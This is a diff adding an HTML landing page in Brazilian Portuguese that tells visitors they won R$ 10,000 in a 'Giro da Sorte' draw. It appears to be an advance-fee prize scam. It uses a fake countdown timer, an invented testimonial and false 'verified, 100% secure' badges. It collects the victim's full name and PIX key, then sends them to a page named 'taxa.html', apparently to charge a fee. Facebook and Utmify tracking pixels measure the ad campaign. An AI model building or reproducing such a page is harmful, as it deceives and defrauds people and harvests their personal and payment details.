@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RESGATAR PRÊMIO - GIRO DA SORTE</title>
+    <meta name="description" content="Você foi oficialmente selecionado para receber R$ 10.000! Apenas 14 minutos restantes para resgatar seu prêmio garantido via PIX.">
+    <link href="style.css" rel="stylesheet" type="text/css" />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=Poppins:wght@300;400;600;700;800;900&display=swap" rel="stylesheet">
+
+<!-- Pixel Milhão (Agência 3) -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1412964459801011');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1412964459801011&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Pixel Milhão (Agência 3) -->
+<script>
+  window.pixelId = "68e42b2ac7626a879f16923c";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+</head>
+<body>
+    <div class="container">
+        <!-- Header com Logo -->
+        <header class="header">
+            <img src="attached_assets/logo.png" alt="Pix do Milhão" class="logo">
+        </header>
+
+        <!-- Hero Section - Anúncio do Prêmio -->
+        <section class="hero">
+            <div class="winner-badge">
+                🏆 GANHADOR OFICIAL
+            </div>
+
+            <h1 class="hero-title">PARABÉNS, VOCÊ GANHOU NO GIRO DA SORTE!🎉	
+            </h1>
+
+            <div class="prize-container">
+                <div class="prize-label">PRÊMIO GARANTIDO NO VALOR DE:</div>
+                <div class="prize-amount">R$ 10.000,00</div>
+                <!--<div class="prize-subtitle">
+                    ✅ VERIFICADO E APROVADO.
+				</div>-->
+            </div>
+
+            <div class="urgency-banner">
+                ⏰ Você tem apenas <strong id="timer">14:59</strong> para resgatar!
+            </div>
+        </section>
+
+        <!-- Formulário de Resgate -->
+        <section class="claim-section">
+            <div class="form-header">
+                <h2>💸 RESGATE IMEDIATO VIA PIX</h2>
+                <p>Preencha os dados abaixo e receba em até <strong>15 minutos</strong></p>
+            </div>
+
+            <form class="claim-form" id="claimForm">
+                <div class="input-group">
+                    <label for="name">Nome Completo *</label>
+                    <input type="text" id="name" class="form-input" placeholder="Digite seu nome completo" required autocomplete="name">
+                </div>
+
+                <div class="input-group">
+                    <label for="pix-type">Tipo de Chave PIX *</label>
+                    <select id="pix-type" class="form-input" required>
+                        <option value="">Selecione o tipo</option>
+                        <option value="cpf">CPF</option>
+                        <option value="email">E-mail</option>
+                        <option value="telefone">Telefone</option>
+                        <option value="aleatoria">Chave Aleatória</option>
+                    </select>
+                </div>
+
+                <div class="input-group">
+                    <label for="pix">Chave PIX *</label>
+                    <input type="text" id="pix" class="form-input" placeholder="Digite sua chave PIX" maxlength="50" required autocomplete="off">
+                    <div id="pix-validation" class="validation-message"></div>
+                </div>
+            </form>
+			<button class="cta-button primary" onclick="window.location.href='taxa.html'" style="margin: 40px 0; transform: scale(1.05); box-shadow: 0 12px 30px rgba(16, 185, 129, 0.4);">
+				<!--span class="button-text">🎯 RESGATAR MEU PRÊMIO DE R$10.000,00 AGORA!</span>-->
+				<span class="button-text">RESGATAR PRÊMIO</span>
+				<span class="button-subtext">Transferência Instantânea • 100% SEGURO</span>
+            </button>
+        </section>
+
+        <!-- Prova Social -->
+        <section class="social-proof">
+            <div class="testimonial">
+                <div class="testimonial-content">
+                    "Recebi meu prêmio de 10 mil em poucos minutos! Estou até agora sem acreditar vai me ajudar muitooo!!"
+                </div>
+                <div class="testimonial-author">Maria Silva - Cabeleireira - São Paulo - SP</div>
+            </div>
+        </section>
+
+        <!-- Footer com Garantias -->
+        <footer class="security-footer">
+            <div class="security-badges">
+                <span class="badge">✅ SITE VERIFICADO 🔒 100% SEGURO</span>
+                <!--<span class="badge">⚡ Instantâneo</span>-->
+            </div>
+        </footer>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
